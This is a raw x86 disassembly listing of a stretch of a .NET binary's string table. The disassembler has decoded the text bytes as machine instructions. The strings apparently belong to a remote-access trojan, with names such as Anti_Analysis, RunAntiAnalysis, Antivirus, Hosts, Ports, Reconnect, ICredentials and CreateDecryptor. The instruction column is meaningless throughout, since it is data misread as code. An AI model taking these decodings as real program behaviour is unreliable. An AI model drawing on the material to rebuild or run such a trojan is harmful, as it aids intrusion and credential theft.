  408c86:	53                   	push   %ebx
  408c87:	74 72                	je     0x408cfb
  408c89:	65 61                	gs popa
  408c8b:	6d                   	insl   (%dx),%es:(%edi)
  408c8c:	57                   	push   %edi
  408c8d:	72 69                	jb     0x408cf8
  408c8f:	74 65                	je     0x408cf6
  408c91:	72 00                	jb     0x408c93
  408c93:	54                   	push   %esp
  408c94:	65 78 74             	gs js  0x408d0b
  408c97:	57                   	push   %edi
  408c98:	72 69                	jb     0x408d03
  408c9a:	74 65                	je     0x408d01
  408c9c:	72 00                	jb     0x408c9e
  408c9e:	45                   	inc    %ebp
  408c9f:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca0:	74 65                	je     0x408d07
  408ca2:	72 00                	jb     0x408ca4
  408ca4:	42                   	inc    %edx
  408ca5:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cac:	72 
  408cad:	74 65                	je     0x408d14
  408caf:	72 00                	jb     0x408cb1
  408cb1:	54                   	push   %esp
  408cb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb3:	4c                   	dec    %esp
  408cb4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb5:	77 65                	ja     0x408d1c
  408cb7:	72 00                	jb     0x408cb9
  408cb9:	45                   	inc    %ebp
  408cba:	72 72                	jb     0x408d2e
  408cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbd:	72 00                	jb     0x408cbf
  408cbf:	49                   	dec    %ecx
  408cc0:	45                   	inc    %ebp
  408cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc2:	75 6d                	jne    0x408d31
  408cc4:	65 72 61             	gs jb  0x408d28
  408cc7:	74 6f                	je     0x408d38
  408cc9:	72 00                	jb     0x408ccb
  408ccb:	4d                   	dec    %ebp
  408ccc:	61                   	popa
  408ccd:	6e                   	outsb  %ds:(%esi),(%dx)
  408cce:	61                   	popa
  408ccf:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cd2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cd4:	74 4f                	je     0x408d25
  408cd6:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cd9:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408cdd:	75 6d                	jne    0x408d4c
  408cdf:	65 72 61             	gs jb  0x408d43
  408ce2:	74 6f                	je     0x408d53
  408ce4:	72 00                	jb     0x408ce6
  408ce6:	53                   	push   %ebx
  408ce7:	79 73                	jns    0x408d5c
  408ce9:	74 65                	je     0x408d50
  408ceb:	6d                   	insl   (%dx),%es:(%edi)
  408cec:	2e 43                	cs inc %ebx
  408cee:	6f                   	outsl  %ds:(%esi),(%dx)
  408cef:	6c                   	insb   (%dx),%es:(%edi)
  408cf0:	6c                   	insb   (%dx),%es:(%edi)
  408cf1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cf6:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf7:	73 2e                	jae    0x408d27
  408cf9:	49                   	dec    %ecx
  408cfa:	45                   	inc    %ebp
  408cfb:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfc:	75 6d                	jne    0x408d6b
  408cfe:	65 72 61             	gs jb  0x408d62
  408d01:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d05:	47                   	inc    %edi
  408d06:	65 74 45             	gs je  0x408d4e
  408d09:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0a:	75 6d                	jne    0x408d79
  408d0c:	65 72 61             	gs jb  0x408d70
  408d0f:	74 6f                	je     0x408d80
  408d11:	72 00                	jb     0x408d13
  408d13:	41                   	inc    %ecx
  408d14:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d18:	61                   	popa
  408d19:	74 6f                	je     0x408d8a
  408d1b:	72 00                	jb     0x408d1d
  408d1d:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d22:	00 2e                	add    %ch,(%esi)
  408d24:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d27:	6f                   	outsl  %ds:(%esi),(%dx)
  408d28:	72 00                	jb     0x408d2a
  408d2a:	4d                   	dec    %ebp
  408d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2d:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d34:	65 
  408d35:	61                   	popa
  408d36:	74 65                	je     0x408d9d
  408d38:	44                   	inc    %esp
  408d39:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d3d:	70 74                	jo     0x408db3
  408d3f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d40:	72 00                	jb     0x408d42
  408d42:	43                   	inc    %ebx
  408d43:	72 65                	jb     0x408daa
  408d45:	61                   	popa
  408d46:	74 65                	je     0x408dad
  408d48:	45                   	inc    %ebp
  408d49:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4a:	63 72 79             	arpl   %esi,0x79(%edx)
  408d4d:	70 74                	jo     0x408dc3
  408d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d50:	72 00                	jb     0x408d52
  408d52:	49                   	dec    %ecx
  408d53:	6e                   	outsb  %ds:(%esi),(%dx)
  408d54:	74 50                	je     0x408da6
  408d56:	74 72                	je     0x408dca
  408d58:	00 53 79             	add    %dl,0x79(%ebx)
  408d5b:	73 74                	jae    0x408dd1
  408d5d:	65 6d                	gs insl (%dx),%es:(%edi)
  408d5f:	2e 44                	cs inc %esp
  408d61:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d68:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d6f:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d76:	6f                   	outsl  %ds:(%esi),(%dx)
  408d77:	64 73 00             	fs jae 0x408d7a
  408d7a:	4d                   	dec    %ebp
  408d7b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d82:	74 2e                	je     0x408db2
  408d84:	56                   	push   %esi
  408d85:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d8c:	73 69                	jae    0x408df7
  408d8e:	63 2e                	arpl   %ebp,(%esi)
  408d90:	44                   	inc    %esp
  408d91:	65 76 69             	gs jbe 0x408dfd
  408d94:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d97:	00 53 79             	add    %dl,0x79(%ebx)
  408d9a:	73 74                	jae    0x408e10
  408d9c:	65 6d                	gs insl (%dx),%es:(%edi)
  408d9e:	2e 52                	cs push %edx
  408da0:	75 6e                	jne    0x408e10
  408da2:	74 69                	je     0x408e0d
  408da4:	6d                   	insl   (%dx),%es:(%edi)
  408da5:	65 2e 49             	gs cs dec %ecx
  408da8:	6e                   	outsb  %ds:(%esi),(%dx)
  408da9:	74 65                	je     0x408e10
  408dab:	72 6f                	jb     0x408e1c
  408dad:	70 53                	jo     0x408e02
  408daf:	65 72 76             	gs jb  0x408e28
  408db2:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408db9:	73 74                	jae    0x408e2f
  408dbb:	65 6d                	gs insl (%dx),%es:(%edi)
  408dbd:	2e 52                	cs push %edx
  408dbf:	75 6e                	jne    0x408e2f
  408dc1:	74 69                	je     0x408e2c
  408dc3:	6d                   	insl   (%dx),%es:(%edi)
  408dc4:	65 2e 43             	gs cs inc %ebx
  408dc7:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc8:	6d                   	insl   (%dx),%es:(%edi)
  408dc9:	70 69                	jo     0x408e34
  408dcb:	6c                   	insb   (%dx),%es:(%edi)
  408dcc:	65 72 53             	gs jb  0x408e22
  408dcf:	65 72 76             	gs jb  0x408e48
  408dd2:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408dd9:	62 75 67             	bound  %esi,0x67(%ebp)
  408ddc:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408de3:	65 
  408de4:	73 00                	jae    0x408de6
  408de6:	45                   	inc    %ebp
  408de7:	78 70                	js     0x408e59
  408de9:	61                   	popa
  408dea:	6e                   	outsb  %ds:(%esi),(%dx)
  408deb:	64 45                	fs inc %ebp
  408ded:	6e                   	outsb  %ds:(%esi),(%dx)
  408dee:	76 69                	jbe    0x408e59
  408df0:	72 6f                	jb     0x408e61
  408df2:	6e                   	outsb  %ds:(%esi),(%dx)
  408df3:	6d                   	insl   (%dx),%es:(%edi)
  408df4:	65 6e                	outsb  %gs:(%esi),(%dx)
  408df6:	74 56                	je     0x408e4e
  408df8:	61                   	popa
  408df9:	72 69                	jb     0x408e64
  408dfb:	61                   	popa
  408dfc:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e00:	00 47 65             	add    %al,0x65(%edi)
  408e03:	74 50                	je     0x408e55
  408e05:	72 6f                	jb     0x408e76
  408e07:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e0a:	73 65                	jae    0x408e71
  408e0c:	73 00                	jae    0x408e0e
  408e0e:	47                   	inc    %edi
  408e0f:	65 74 48             	gs je  0x408e5a
  408e12:	6f                   	outsl  %ds:(%esi),(%dx)
  408e13:	73 74                	jae    0x408e89
  408e15:	41                   	inc    %ecx
  408e16:	64 64 72 65          	fs fs jb 0x408e7f
  408e1a:	73 73                	jae    0x408e8f
  408e1c:	65 73 00             	gs jae 0x408e1f
  408e1f:	53                   	push   %ebx
  408e20:	79 73                	jns    0x408e95
  408e22:	74 65                	je     0x408e89
  408e24:	6d                   	insl   (%dx),%es:(%edi)
  408e25:	2e 53                	cs push %ebx
  408e27:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e2b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e32:	70 
  408e33:	74 6f                	je     0x408ea4
  408e35:	67 72 61             	addr16 jb 0x408e99
  408e38:	70 68                	jo     0x408ea2
  408e3a:	79 2e                	jns    0x408e6a
  408e3c:	58                   	pop    %eax
  408e3d:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e42:	72 74                	jb     0x408eb8
  408e44:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e4b:	73 00                	jae    0x408e4d
  408e4d:	45                   	inc    %ebp
  408e4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408e4f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e52:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e56:	74 65                	je     0x408ebd
  408e58:	73 00                	jae    0x408e5a
  408e5a:	47                   	inc    %edi
  408e5b:	65 74 55             	gs je  0x408eb3
  408e5e:	74 66                	je     0x408ec6
  408e60:	38 42 79             	cmp    %al,0x79(%edx)
  408e63:	74 65                	je     0x408eca
  408e65:	73 00                	jae    0x408e67
  408e67:	75 74                	jne    0x408edd
  408e69:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e6d:	74 65                	je     0x408ed4
  408e6f:	73 00                	jae    0x408e71
  408e71:	52                   	push   %edx
  408e72:	66 63 32             	arpl   %si,(%edx)
  408e75:	38 39                	cmp    %bh,(%ecx)
  408e77:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e7b:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e82:	73 00                	jae    0x408e84
  408e84:	52                   	push   %edx
  408e85:	65 61                	gs popa
  408e87:	64 41                	fs inc %ecx
  408e89:	6c                   	insb   (%dx),%es:(%edi)
  408e8a:	6c                   	insb   (%dx),%es:(%edi)
  408e8b:	42                   	inc    %edx
  408e8c:	79 74                	jns    0x408f02
  408e8e:	65 73 00             	gs jae 0x408e91
  408e91:	44                   	inc    %esp
  408e92:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e96:	65 46                	gs inc %esi
  408e98:	72 6f                	jb     0x408f09
  408e9a:	6d                   	insl   (%dx),%es:(%edi)
  408e9b:	42                   	inc    %edx
  408e9c:	79 74                	jns    0x408f12
  408e9e:	65 73 00             	gs jae 0x408ea1
  408ea1:	53                   	push   %ebx
  408ea2:	77 61                	ja     0x408f05
  408ea4:	70 42                	jo     0x408ee8
  408ea6:	79 74                	jns    0x408f1c
  408ea8:	65 73 00             	gs jae 0x408eab
  408eab:	4c                   	dec    %esp
  408eac:	6f                   	outsl  %ds:(%esi),(%dx)
  408ead:	61                   	popa
  408eae:	64 46                	fs inc %esi
  408eb0:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408eb7:	74 
  408eb8:	65 73 00             	gs jae 0x408ebb
  408ebb:	47                   	inc    %edi
  408ebc:	65 74 41             	gs je  0x408f00
  408ebf:	73 42                	jae    0x408f03
  408ec1:	79 74                	jns    0x408f37
  408ec3:	65 73 00             	gs jae 0x408ec6
  408ec6:	53                   	push   %ebx
  408ec7:	65 74 41             	gs je  0x408f0b
  408eca:	73 42                	jae    0x408f0e
  408ecc:	79 74                	jns    0x408f42
  408ece:	65 73 00             	gs jae 0x408ed1
  408ed1:	47                   	inc    %edi
  408ed2:	65 74 42             	gs je  0x408f17
  408ed5:	79 74                	jns    0x408f4b
  408ed7:	65 73 00             	gs jae 0x408eda
  408eda:	72 61                	jb     0x408f3d
  408edc:	77 42                	ja     0x408f20
  408ede:	79 74                	jns    0x408f54
  408ee0:	65 73 00             	gs jae 0x408ee3
  408ee3:	62 79 74             	bound  %edi,0x74(%ecx)
  408ee6:	65 73 00             	gs jae 0x408ee9
  408ee9:	43                   	inc    %ebx
  408eea:	53                   	push   %ebx
  408eeb:	68 61 72 70 41       	push   $0x41707261
  408ef0:	72 67                	jb     0x408f59
  408ef2:	75 6d                	jne    0x408f61
  408ef4:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ef6:	74 49                	je     0x408f41
  408ef8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ef9:	66 6f                	outsw  %ds:(%esi),(%dx)
  408efb:	46                   	inc    %esi
  408efc:	6c                   	insb   (%dx),%es:(%edi)
  408efd:	61                   	popa
  408efe:	67 73 00             	addr16 jae 0x408f01
  408f01:	43                   	inc    %ebx
  408f02:	53                   	push   %ebx
  408f03:	68 61 72 70 42       	push   $0x42707261
  408f08:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f0f:	61                   	popa
  408f10:	67 73 00             	addr16 jae 0x408f13
  408f13:	65 73 46             	gs jae 0x408f5c
  408f16:	6c                   	insb   (%dx),%es:(%edi)
  408f17:	61                   	popa
  408f18:	67 73 00             	addr16 jae 0x408f1b
  408f1b:	53                   	push   %ebx
  408f1c:	74 72                	je     0x408f90
  408f1e:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f25:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f2c:	65 
  408f2d:	53                   	push   %ebx
  408f2e:	65 74 74             	gs je  0x408fa5
  408f31:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f38:	73 73                	jae    0x408fad
  408f3a:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f41:	6e                   	outsb  %ds:(%esi),(%dx)
  408f42:	67 45                	addr16 inc %ebp
  408f44:	76 65                	jbe    0x408fab
  408f46:	6e                   	outsb  %ds:(%esi),(%dx)
  408f47:	74 41                	je     0x408f8a
  408f49:	72 67                	jb     0x408fb2
  408f4b:	73 00                	jae    0x408f4d
  408f4d:	41                   	inc    %ecx
  408f4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4f:	74 69                	je     0x408fba
  408f51:	5f                   	pop    %edi
  408f52:	41                   	inc    %ecx
  408f53:	6e                   	outsb  %ds:(%esi),(%dx)
  408f54:	61                   	popa
  408f55:	6c                   	insb   (%dx),%es:(%edi)
  408f56:	79 73                	jns    0x408fcb
  408f58:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f60:	74 69                	je     0x408fcb
  408f62:	41                   	inc    %ecx
  408f63:	6e                   	outsb  %ds:(%esi),(%dx)
  408f64:	61                   	popa
  408f65:	6c                   	insb   (%dx),%es:(%edi)
  408f66:	79 73                	jns    0x408fdb
  408f68:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f6f:	73 00                	jae    0x408f71
  408f71:	49                   	dec    %ecx
  408f72:	43                   	inc    %ebx
  408f73:	72 65                	jb     0x408fda
  408f75:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f78:	74 69                	je     0x408fe3
  408f7a:	61                   	popa
  408f7b:	6c                   	insb   (%dx),%es:(%edi)
  408f7c:	73 00                	jae    0x408f7e
  408f7e:	73 65                	jae    0x408fe5
  408f80:	74 5f                	je     0x408fe1
  408f82:	43                   	inc    %ebx
  408f83:	72 65                	jb     0x408fea
  408f85:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f88:	74 69                	je     0x408ff3
  408f8a:	61                   	popa
  408f8b:	6c                   	insb   (%dx),%es:(%edi)
  408f8c:	73 00                	jae    0x408f8e
  408f8e:	45                   	inc    %ebp
  408f8f:	71 75                	jno    0x409006
  408f91:	61                   	popa
  408f92:	6c                   	insb   (%dx),%es:(%edi)
  408f93:	73 00                	jae    0x408f95
  408f95:	53                   	push   %ebx
  408f96:	73 6c                	jae    0x409004
  408f98:	50                   	push   %eax
  408f99:	72 6f                	jb     0x40900a
  408f9b:	74 6f                	je     0x40900c
  408f9d:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fa0:	73 00                	jae    0x408fa2
  408fa2:	52                   	push   %edx
  408fa3:	65 61                	gs popa
  408fa5:	64 54                	fs push %esp
  408fa7:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa9:	6c                   	insb   (%dx),%es:(%edi)
  408faa:	73 00                	jae    0x408fac
  408fac:	57                   	push   %edi
  408fad:	72 69                	jb     0x409018
  408faf:	74 65                	je     0x409016
  408fb1:	54                   	push   %esp
  408fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb4:	6c                   	insb   (%dx),%es:(%edi)
  408fb5:	73 00                	jae    0x408fb7
  408fb7:	42                   	inc    %edx
  408fb8:	79 74                	jns    0x40902e
  408fba:	65 73 54             	gs jae 0x409011
  408fbd:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbf:	6c                   	insb   (%dx),%es:(%edi)
  408fc0:	73 00                	jae    0x408fc2
  408fc2:	53                   	push   %ebx
  408fc3:	79 73                	jns    0x409038
  408fc5:	74 65                	je     0x40902c
  408fc7:	6d                   	insl   (%dx),%es:(%edi)
  408fc8:	2e 57                	cs push %edi
  408fca:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fd1:	46                   	inc    %esi
  408fd2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd3:	72 6d                	jb     0x409042
  408fd5:	73 00                	jae    0x408fd7
  408fd7:	44                   	inc    %esp
  408fd8:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd9:	73 00                	jae    0x408fdb
  408fdb:	43                   	inc    %ebx
  408fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  408fde:	74 61                	je     0x409041
  408fe0:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408fe7:	74 65                	je     0x40904e
  408fe9:	6d                   	insl   (%dx),%es:(%edi)
  408fea:	2e 43                	cs inc %ebx
  408fec:	6f                   	outsl  %ds:(%esi),(%dx)
  408fed:	6c                   	insb   (%dx),%es:(%edi)
  408fee:	6c                   	insb   (%dx),%es:(%edi)
  408fef:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff5:	73 00                	jae    0x408ff7
  408ff7:	53                   	push   %ebx
  408ff8:	74 72                	je     0x40906c
  408ffa:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409001:	74 4f                	je     0x409052
  409003:	70 74                	jo     0x409079
  409005:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40900c:	74 49                	je     0x409057
  40900e:	6d                   	insl   (%dx),%es:(%edi)
  40900f:	61                   	popa
  409010:	67 65 44             	addr16 gs inc %esp
  409013:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409017:	65 72 73             	gs jb  0x40908d
  40901a:	00 52 75             	add    %dl,0x75(%edx)
  40901d:	6e                   	outsb  %ds:(%esi),(%dx)
  40901e:	74 69                	je     0x409089
  409020:	6d                   	insl   (%dx),%es:(%edi)
  409021:	65 48                	gs dec %eax
  409023:	65 6c                	gs insb (%dx),%es:(%edi)
  409025:	70 65                	jo     0x40908c
  409027:	72 73                	jb     0x40909c
  409029:	00 53 73             	add    %dl,0x73(%ebx)
  40902c:	6c                   	insb   (%dx),%es:(%edi)
  40902d:	50                   	push   %eax
  40902e:	6f                   	outsl  %ds:(%esi),(%dx)
  40902f:	6c                   	insb   (%dx),%es:(%edi)
  409030:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409037:	72 73                	jb     0x4090ac
  409039:	00 73 73             	add    %dh,0x73(%ebx)
  40903c:	6c                   	insb   (%dx),%es:(%edi)
  40903d:	50                   	push   %eax
  40903e:	6f                   	outsl  %ds:(%esi),(%dx)
  40903f:	6c                   	insb   (%dx),%es:(%edi)
  409040:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409047:	72 73                	jb     0x4090bc
  409049:	00 46 69             	add    %al,0x69(%esi)
  40904c:	6c                   	insb   (%dx),%es:(%edi)
  40904d:	65 41                	gs inc %ecx
  40904f:	63 63 65             	arpl   %esp,0x65(%ebx)
  409052:	73 73                	jae    0x4090c7
  409054:	00 68 50             	add    %ch,0x50(%eax)
  409057:	72 6f                	jb     0x4090c8
  409059:	63 65 73             	arpl   %esp,0x73(%ebp)
  40905c:	73 00                	jae    0x40905e
  40905e:	47                   	inc    %edi
  40905f:	65 74 43             	gs je  0x4090a5
  409062:	75 72                	jne    0x4090d6
  409064:	72 65                	jb     0x4090cb
  409066:	6e                   	outsb  %ds:(%esi),(%dx)
  409067:	74 50                	je     0x4090b9
  409069:	72 6f                	jb     0x4090da
  40906b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40906e:	73 00                	jae    0x409070
  409070:	49                   	dec    %ecx
  409071:	50                   	push   %eax
  409072:	41                   	inc    %ecx
  409073:	64 64 72 65          	fs fs jb 0x4090dc
  409077:	73 73                	jae    0x4090ec
  409079:	00 43 6f             	add    %al,0x6f(%ebx)
  40907c:	6d                   	insl   (%dx),%es:(%edi)
  40907d:	70 72                	jo     0x4090f1
  40907f:	65 73 73             	gs jae 0x4090f5
  409082:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  409086:	6f                   	outsl  %ds:(%esi),(%dx)
  409087:	6d                   	insl   (%dx),%es:(%edi)
  409088:	70 72                	jo     0x4090fc
  40908a:	65 73 73             	gs jae 0x409100
  40908d:	00 53 79             	add    %dl,0x79(%ebx)
  409090:	73 74                	jae    0x409106
  409092:	65 6d                	gs insl (%dx),%es:(%edi)
  409094:	2e 4e                	cs dec %esi
  409096:	65 74 2e             	gs je  0x4090c7
  409099:	53                   	push   %ebx
  40909a:	6f                   	outsl  %ds:(%esi),(%dx)
  40909b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40909e:	74 73                	je     0x409113
  4090a0:	00 73 65             	add    %dh,0x65(%ebx)
  4090a3:	74 5f                	je     0x409104
  4090a5:	41                   	inc    %ecx
  4090a6:	72 67                	jb     0x40910f
  4090a8:	75 6d                	jne    0x409117
  4090aa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090ac:	74 73                	je     0x409121
  4090ae:	00 53 79             	add    %dl,0x79(%ebx)
  4090b1:	73 74                	jae    0x409127
  4090b3:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b5:	45                   	inc    %ebp
  4090b6:	76 65                	jbe    0x40911d
  4090b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b9:	74 73                	je     0x40912e
  4090bb:	00 50 6f             	add    %dl,0x6f(%eax)
  4090be:	72 74                	jb     0x409134
  4090c0:	73 00                	jae    0x4090c2
  4090c2:	45                   	inc    %ebp
  4090c3:	78 69                	js     0x40912e
  4090c5:	73 74                	jae    0x40913b
  4090c7:	73 00                	jae    0x4090c9
  4090c9:	48                   	dec    %eax
  4090ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4090cb:	73 74                	jae    0x409141
  4090cd:	73 00                	jae    0x4090cf
  4090cf:	41                   	inc    %ecx
  4090d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d1:	74 69                	je     0x40913c
  4090d3:	76 69                	jbe    0x40913e
  4090d5:	72 75                	jb     0x40914c
  4090d7:	73 00                	jae    0x4090d9
  4090d9:	43                   	inc    %ebx
  4090da:	6f                   	outsl  %ds:(%esi),(%dx)
  4090db:	6e                   	outsb  %ds:(%esi),(%dx)
  4090dc:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090df:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090e2:	61                   	popa
  4090e3:	67 65 46             	addr16 gs inc %esi
  4090e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e7:	72 6d                	jb     0x409156
  4090e9:	61                   	popa
  4090ea:	74 00                	je     0x4090ec
  4090ec:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090ee:	72 6d                	jb     0x40915d
  4090f0:	61                   	popa
  4090f1:	74 00                	je     0x4090f3
  4090f3:	57                   	push   %edi
  4090f4:	72 69                	jb     0x40915f
  4090f6:	74 65                	je     0x40915d
  4090f8:	46                   	inc    %esi
  4090f9:	6c                   	insb   (%dx),%es:(%edi)
  4090fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4090fb:	61                   	popa
  4090fc:	74 00                	je     0x4090fe
  4090fe:	67 65 74 5f          	addr16 gs je 0x409161
  409102:	41                   	inc    %ecx
  409103:	73 46                	jae    0x40914b
  409105:	6c                   	insb   (%dx),%es:(%edi)
  409106:	6f                   	outsl  %ds:(%esi),(%dx)
  409107:	61                   	popa
  409108:	74 00                	je     0x40910a
  40910a:	73 65                	jae    0x409171
  40910c:	74 5f                	je     0x40916d
  40910e:	41                   	inc    %ecx
  40910f:	73 46                	jae    0x409157
  409111:	6c                   	insb   (%dx),%es:(%edi)
  409112:	6f                   	outsl  %ds:(%esi),(%dx)
  409113:	61                   	popa
  409114:	74 00                	je     0x409116
  409116:	47                   	inc    %edi
  409117:	65 74 41             	gs je  0x40915b
  40911a:	73 46                	jae    0x409162
  40911c:	6c                   	insb   (%dx),%es:(%edi)
  40911d:	6f                   	outsl  %ds:(%esi),(%dx)
  40911e:	61                   	popa
  40911f:	74 00                	je     0x409121
  409121:	53                   	push   %ebx
  409122:	65 74 41             	gs je  0x409166
  409125:	73 46                	jae    0x40916d
  409127:	6c                   	insb   (%dx),%es:(%edi)
  409128:	6f                   	outsl  %ds:(%esi),(%dx)
  409129:	61                   	popa
  40912a:	74 00                	je     0x40912c
  40912c:	46                   	inc    %esi
  40912d:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  409134:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409138:	61                   	popa
  409139:	6e                   	outsb  %ds:(%esi),(%dx)
  40913a:	61                   	popa
  40913b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40913e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409140:	74 42                	je     0x409184
  409142:	61                   	popa
  409143:	73 65                	jae    0x4091aa
  409145:	4f                   	dec    %edi
  409146:	62 6a 65             	bound  %ebp,0x65(%edx)
  409149:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  40914d:	6f                   	outsl  %ds:(%esi),(%dx)
  40914e:	72 63                	jb     0x4091b3
  409150:	65 50                	gs push %eax
  409152:	61                   	popa
  409153:	74 68                	je     0x4091bd
  409155:	4f                   	dec    %edi
  409156:	62 6a 65             	bound  %ebp,0x65(%edx)
  409159:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40915d:	6f                   	outsl  %ds:(%esi),(%dx)
  40915e:	6c                   	insb   (%dx),%es:(%edi)
  40915f:	6c                   	insb   (%dx),%es:(%edi)
  409160:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409165:	6f                   	outsl  %ds:(%esi),(%dx)
  409166:	6e                   	outsb  %ds:(%esi),(%dx)
  409167:	6e                   	outsb  %ds:(%esi),(%dx)
  409168:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  40916d:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409171:	6e                   	outsb  %ds:(%esi),(%dx)
  409172:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409177:	65 74 00             	gs je  0x40917a
  40917a:	53                   	push   %ebx
  40917b:	79 73                	jns    0x4091f0
  40917d:	74 65                	je     0x4091e4
  40917f:	6d                   	insl   (%dx),%es:(%edi)
